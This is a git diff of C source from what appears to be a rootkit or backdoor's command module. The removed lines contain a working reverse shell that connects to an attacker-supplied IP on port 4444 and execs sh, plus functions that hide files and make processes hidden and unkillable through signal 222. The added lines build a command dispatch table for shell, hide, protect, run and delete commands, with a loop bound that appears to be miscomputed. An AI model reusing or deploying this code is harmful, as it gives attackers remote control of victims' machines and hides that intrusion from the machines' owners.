@@ -1,119 +1,73 @@
-#include "../inc/config.h"
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <sys/types.h>
-#include <arpa/inet.h>
-#include <stdbool.h>
-#include <string.h>
-#include <stdarg.h>
+#include "inc/cmds.h"
+#include "inc/job.h"
+#include "inc/util.h"
+
+#include <sys/utsname.h>
+
+#include <inttypes.h>
+#include <sys/stat.h>
+
+#include <dirent.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
-#include <signal.h>
-#include <libgen.h>
-#include <limits.h>
+
+#include <errno.h>
 #include <stdio.h>
 
-#include "util.h"
-#include "cmds.h"
+#include <math.h>
+#include <time.h>
 
-int cmd_shell(int s) {
-  info(s, "Enter an IP for the reverse shell");
-  info(s, "You will receive the connection on port 4444");
-  prompt(s);
+struct cmd_handler_t {
+  char *(*handler)(job_t *job);
+  cmd_t cmd;
+};
 
-  char* ip = recvline(s);
-  if(NULL == ip)
-    return -1;
-
-  info(s, "Creating the reverse shell fork...");
-
-  int fpid = fork();
-  if(fpid == 0){
-    close(s);
-    struct sockaddr_in revsockaddr;
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-
-    revsockaddr.sin_family = AF_INET;       
-    revsockaddr.sin_port = htons(4444);
-    revsockaddr.sin_addr.s_addr = inet_addr(ip);
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
-      sizeof(revsockaddr));
-
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
-
-    char * const argv[] = {"sh", NULL};
-    execvp("sh", argv);
-  }
-
-  if(fpid<0){
-    error(s, "Fork failed :<");
-    goto END;
-  }
-
-  kill(fpid, 222);
-  info(s, "Fork created, enjoy your shell");
-  free(ip);
-  return 0;
-
-END:
-  free(ip);
-  return -1;
+// recv all the data for the job
+bool __cmd_recv_all(job_t *job) {
+  while (!job->complete)
+    if (job_recv(job, false) != JOB_RECV_OK)
+      return false;
+  return true;
 }
 
-int cmd_hide(int s) {
-  info(s, "Enter full path for the file");
-  info(s, "It will be moved to [USUM]_[name]");
-  prompt(s);
+struct cmd_handler_t handlers[] = {
+    {.handler = cmd_ps,      .cmd = 'O'},
+    {.handler = cmd_run,     .cmd = 'R'},
+    {.handler = cmd_info,    .cmd = 'I'},
+    {.handler = cmd_list,    .cmd = 'L'},
+    {.handler = cmd_hide,    .cmd = 'H'},
+    {.handler = cmd_shell,   .cmd = 'S'},
+    {.handler = cmd_chdir,   .cmd = 'C'},
+    {.handler = cmd_unhide,  .cmd = 'U'},
+    {.handler = cmd_delete,  .cmd = 'D'},
+    {.handler = cmd_protect, .cmd = 'P'},
+};
 
-  char* path = recvline(s);
-  if(NULL == path)
-    return -1;
+bool cmd_handle(job_t *job) {
+  struct cmd_handler_t *h   = NULL;
+  char                 *res = NULL;
+  uint8_t               i   = 0;
 
-  if(!exists(path)){
-    error(s, "Cannot access the file");
-    free(path);
-    return -1;
+  for (; i < sizeof(handlers); i++) {
+    if (handlers[i].cmd == job->cmd) {
+      h = &handlers[i];
+      break;
+    }
   }
 
-  char* pathcp = strdup(path);
-  char* file   = basename(path);
-  char* dir    = dirname(path);
+  if (NULL == h)
+    return false;
 
-  char newpath[strlen(path)+strlen(USUM)];
-  sprintf(newpath, "%s/%s_%s", dir, USUM, file);
+  job_debug("handling the command '%c' with %p", job->cmd, h->handler);
 
-  if(rename(pathcp, newpath)<0){
-    error(s, "Move failed!");
-    free(pathcp);
-    free(path);
-    return -1;
+  if ((res = h->handler(job)) != NULL) {
+    job_data_clear(job);
+    job_data_set(job, res, 0);
+
+    job->complete = true;
+    job_send(job, false);
   }
 
-  info(s, "Moved file");
-  free(pathcp);
-  free(path);
-  return 0;
-}
-
-int cmd_pid(int s) {
-  info(s, "Enter a process PID to protect");
-  info(s, "Process will be hidden and unkillable");
-  prompt(s);
-
-  char* pidstr = recvline(s);
-  if(NULL == pidstr)
-    return -1;
-
-  int pid = atoi(pidstr);
-  if(pid<=0){
-    error(s, "Bad PID");
-    free(pidstr);
-    return -1;
-  }
-
-  info(s, "Sending signal to the PID...");
-  kill(pid, 222);
-  return 0;
+  return true;
 }
